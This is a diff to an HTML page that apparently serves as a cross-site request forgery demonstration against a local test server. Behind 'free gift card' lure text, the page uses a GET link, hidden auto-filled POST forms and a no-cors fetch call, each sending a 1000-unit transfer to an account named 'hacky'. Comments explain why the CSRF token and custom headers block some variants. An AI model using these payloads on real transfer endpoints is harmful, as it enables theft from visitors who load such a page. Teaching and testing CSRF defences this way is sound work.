@@ -8,9 +8,11 @@
 </head>
 <body>
     <h1>Get a free gift card!</h1>
+    <p>(GET request)</p>
     <a href="http://localhost:4000/transfer?amount=1000&recipient=hacky">Click here!</a>
     <br />
     <h2>or here, if that doesn't work!</h2>
+    <p>(POST request)</p>
     <form method="post" action="http://localhost:4000/transfer">
         <!-- attacker doesn't have CSRF token -->
         <input type="hidden" name="amount" value="1000" />
@@ -19,6 +21,7 @@
     </form>
     <!-- API -->
     <h2>or here for two gift cards in one click! wow, amazing!</h2>
+    <p>(API request)</p>
     <br />
     <form method="post" action="http://localhost:4000/api/transfer">
         <!-- not possible to set custom header on HTML form -->
@@ -27,9 +30,10 @@
         <input type="hidden" name="recipient" value="hacky" />
         <button type="submit">Get free gift card!</button>
     </form>
-    <!-- API 2 -->
+    <!-- JS -->
     <h2>or here for three gift cards in one click! wow, amazing!</h2>
     <br />
+    <p>(JS request)</p>
     <div>
         <!-- not possible to set custom header on HTML form -->
         <input type="hidden" id="amount" name="amount" value="1000" />
@@ -46,7 +50,8 @@
 
             console.log({ amount, username, recipient})
 
-            fetch('http://localhost:4000/api/transfer', {
+            // fetch('http://localhost:4000/api/transfer', {
+            fetch('http://localhost:4000/transfer', {
                 method: 'POST',
                 mode: "no-cors", // no-cors doesn't allow any custom headers
                 //      nor JSON content-type
